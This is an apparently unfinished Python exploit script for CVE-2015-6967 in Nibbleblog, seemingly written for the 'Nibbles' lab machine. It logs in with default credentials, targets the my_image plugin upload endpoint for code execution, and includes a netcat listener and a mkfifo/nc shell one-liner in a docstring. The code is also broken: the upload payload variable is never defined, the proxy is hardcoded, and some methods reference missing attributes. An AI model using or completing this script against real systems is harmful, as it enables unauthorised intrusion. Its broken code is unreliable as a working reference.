#!./venv/bin/active
import requests
import argparse
import socket
import sys
import nclib

class NibbleExploit:

    __cve = "CVE-2015-6967"
    __description = ""

    def __init__(self):
        """ Load Exploit """
        print("Initialising exploit for {0}".format(self.__cve))

    def exploit(self, target, username, password, proxy):

        """ GET Login """
        url = "http://{0}".format(target)
        response = requests.get(url, headers={'Cookie':''})

        """ Parse Cookie"""
        session_id = response.headers['Set-Cookie']
        session_id = session_id.split(";")
        session_id = session_id[0]

        """ Null values for reuse """
        url = None
        response = None

        """ Prepare Login Request """
        url = "http://{0}/admin.php".format(target)
        data = {
            'username':username,
            'password':password
        }

        """ Need to allow user to define proxy """
        proxies = {
            'http':'127.0.0.1:8080',
            'https':'127.0.0.1:8080',
        }
        headers = {
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
            'Cookie':session_id
        }
        """ Authenticate """
        response = requests.post(url, data=data, headers=headers, proxies=proxies)
        if not response.status_code == 200:
            print("Login unsuccessful")
            sys.exit()

        """ Reset session_id incase the cookie is replaced/ destroyed """
        session_id = None
        session_id = response.headers['Set-Cookie']
        session_id = session_id.split(";")
        session_id = session_id[0]

        """ Null variables for reuse """
        response = None
        url = None
        headers = None

        headers = {
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
            'Cookie':session_id
        }


        
        url = "http://{0}/admin.php?controller=plugins&action=config&plugin=my_image".format(target)

        """
        OPTION B:

        files = {
            'plugin': (
                'plugin',
                b'asdf', 
                'multipart/form-data', 
                {'Expires': '0'}
                )
            }
        """

        """
        OPTION A:

        files = [
            ('images', ('foo.png', open('foo.png', 'rb'), 'image/png')),
            ('images', ('bar.png', open('bar.png', 'rb'), 'image/png'))
        ]
        """

        response = requests.post(url,files=files,headers=headers, proxies=proxies)

        """
        payload = {  }
        r = requests.post('http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image')
        post
        """
        

class Listener:

    #__ip_address = "0.0.0.0"
    #__port_number = 0

    def __init__(self):
        """ Load Listener """
        print("Initialising Listener")
    
    def start(self, local_port):
        """ Set Listener to Run """

        self.nc = nclib.Netcat(listen=("127.0.0.1",local_port), verbose=True)
        print("Listening on port {0}... ".format(local_port))

        #(self.client, (remote_ip, remote_port))     
        #print(" Received connection from : {0}:{1}".format(remote_ip,remote_port))

        return self.nc
    
    def send(self, msg):
        self.nc.send(b'\x00\x0dHello, world!')
        response = self.nc.recv()
        
        print(response)
    
    def stop(self):
        #self.client.close()
        try:
            self.nc.close()
        except:
            print("No listener to close")

    def write(self, data):
        return self.sock.send(data)


def main():

    """ 
    
        Arbitrary Command Execution without -e

        $ rm -f /tmp/f; mkfifo /tmp/f
        $ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f

    """

    """ Set default creds. Update later if provided. """
    username = 'admin'
    password = 'nibbles'

    """ Parse Arguments """
    parser = argparse.ArgumentParser()
    parser.add_argument("target",help="Target Nibbleblog installation",type=str)
    parser.add_argument("-u", "--username",help="Nibbleblog username")
    parser.add_argument("-p", "--password",help="Nibbleblog password")
    parser.add_argument("-l", "--listener",help="Automatically start a listener(y/n)")
    parser.add_argument("-x", "--proxy", help="Set http proxy")
    args = parser.parse_args()

    use_listener = args.listener

    if args.username:
        username = args.username
    if args.password:
        password = args.password
    
    """ Init Exploit """
    cve = NibbleExploit()

    if use_listener:
        listener = Listener()
        shell = listener.start(4444)
    #while True:
        
    """
    command = input(b'~$ ')
    listener.send(command)
    """

    cve.exploit(args.target, username, password, args.proxy)
            
    

if __name__ == "__main__":
    main()